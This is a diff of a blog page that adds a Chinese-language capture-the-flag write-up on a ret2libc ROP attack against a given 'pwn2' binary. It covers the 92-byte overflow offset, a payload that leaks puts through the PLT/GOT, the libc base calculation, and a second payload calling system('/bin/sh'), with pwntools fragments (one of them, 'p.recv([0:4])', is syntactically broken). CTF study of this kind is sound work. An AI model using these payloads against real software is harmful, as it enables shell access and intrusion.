@@ -62,6 +62,58 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-PWN-ROP (1)" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/08/27/PWN-ROP (1)/" class="article-date">
+  <time datetime="2019-08-27T12:09:49.958Z" itemprop="datePublished">2019-08-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<h2 id="title：PWN-ROP"><a href="#title：PWN-ROP" class="headerlink" title="title：PWN-ROP"></a>title：PWN-ROP</h2><h1 id="题目：给出PWN2文件和libc"><a href="#题目：给出PWN2文件和libc" class="headerlink" title="题目：给出PWN2文件和libc"></a>题目：给出PWN2文件和libc</h1><p><img src="https://img-blog.csdnimg.cn/20190827200855113.png" alt="在这里插入图片描述"><br>发生栈溢出。</p>
+<h1 id="查看："><a href="#查看：" class="headerlink" title="查看："></a>查看：</h1><p>文件类型及其保护方法<br><img src="https://img-blog.csdnimg.cn/20190827102754531.png" alt="在这里插入图片描述"><br>找system和bin_sh都么有<br><img src="https://img-blog.csdnimg.cn/2019082710294358.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190827103025672.png" alt="在这里插入图片描述"><br>所以只能利用libc文件</p>
+<h1 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h1><p><img src="https://img-blog.csdnimg.cn/20190827095007700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L011TXVMZWVf,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190827094717207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L011TXVMZWVf,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>由于libc的延迟绑定机制，需要选择已经==执行过的函数==作为泄漏函数，这里我们选择put()//输出一句话</p>
+<p>计算偏移量=92<br>但是在gdb里得出offset=91，这是错的。<br><img src="https://img-blog.csdnimg.cn/2019082710463682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L011TXVMZWVf,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在ida中查看main函数的汇编代码的一部分，开辟了58h个空间，加上esp的4个一共5C个，也就是十进制92，与上面得出错误的相差1。不知道为什么。。<br><img src="https://img-blog.csdnimg.cn/20190827200442990.png" alt="在这里插入图片描述"></p>
+<h3 id="构造payload1：-目的：-得到puts的地址：puts-addr"><a href="#构造payload1：-目的：-得到puts的地址：puts-addr" class="headerlink" title="构造payload1：==目的：== 得到puts的地址：puts_addr"></a>构造payload1：==目的：== 得到puts的地址：puts_addr</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=</span><br><span class="line">填充满偏移量的长度 + puts的plt地址_p32(puts_plt) + main函数的地址_p32(main) + puts的got地址_p32(puts_got)</span><br></pre></td></tr></table></figure>
+
+<p>==填充满偏移量的长度== =92=5C h ，下同。<br>==p32(main)== 在ida中查看=0x08048519<br><img src="https://img-blog.csdnimg.cn/20190827153448503.png" alt="在这里插入图片描述"><br>==p32(puts_plt)：==<br><code>puts_plt=elf.plt[&#39;puts&#39;]</code><br>==p32(puts_got)：==<br> <code>puts_got=elf.got[&#39;puts&#39;]</code></p>
+<p>//这里elf的用法因为：<code>elf=ELF(&#39;./pwn2&#39;)</code></p>
+<p>==puts_addr:==<br><code>puts_addr=u32(p.recv([0:4]))</code></p>
+<p>打印地址用到的代码是<code>print &quot;puts_addr:&quot;+hex(puts_addr)</code>，下同。</p>
+<h3 id="构造payload2-目的：-由puts的地址推导出system和’-bin-sh’的地址"><a href="#构造payload2-目的：-由puts的地址推导出system和’-bin-sh’的地址" class="headerlink" title="构造payload2 ==目的：== 由puts的地址推导出system和’/bin/sh’的地址"></a>构造payload2 ==目的：== 由puts的地址推导出system和’/bin/sh’的地址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=</span><br><span class="line">填充满偏移量的长度 +system地址_p32(system) + 4个‘b’ + &apos;/bin/sh&apos;地址_p32(bin_sh)</span><br></pre></td></tr></table></figure>
+
+<p>==p32(system)：==</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">puts_libc=libc.symbols[&apos;puts&apos;]</span><br><span class="line">libc_base=puts_addr-puts_libc</span><br><span class="line">sys_libc=libc.symbols[&apos;system&apos;]</span><br><span class="line">sys_addr=libc_base+sys_libc   //至此得到了p32(sys_addr)</span><br></pre></td></tr></table></figure>
+
+<p>==p32(bin_sh):==</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin_sh_addr=libc_base+next(libc.search(&apos;/bin/sh&apos;))      ///至此得到了p32(bin_sh_addr)</span><br></pre></td></tr></table></figure>
+
+<p>//这里libc的用法因为：<code>libc=ELF(&#39;libc.so.6&#39;)</code></p>
+<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><p><img src="https://img-blog.csdnimg.cn/20190827191902834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L011TXVMZWVf,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>脚本是正确的，但是python 脚本.py之后报错：是最后一句interactive的问题，在别人电脑上就又没有这个问题。。。</p>
+<p>/br<br>/br<br>/br<br>/br<br>一些没用的图：<br><img src="https://img-blog.csdnimg.cn/20190827085545634.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190827091320111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L011TXVMZWVf,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190827091358163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L011TXVMZWVf,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190827094411755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L011TXVMZWVf,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/08/27/PWN-ROP (1)/" data-id="cjztstgd00000r0rhr60mafwd" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-Github博客----别再fork了，自己新建也不难" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2019/08/27/Github博客----别再fork了，自己新建也不难/" class="article-date">
@@ -232,6 +284,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2019/08/27/PWN-ROP (1)/">(no title)</a>
+          </li>
         
           <li>
             <a href="/2019/08/27/Github博客----别再fork了，自己新建也不难/">(no title)</a>
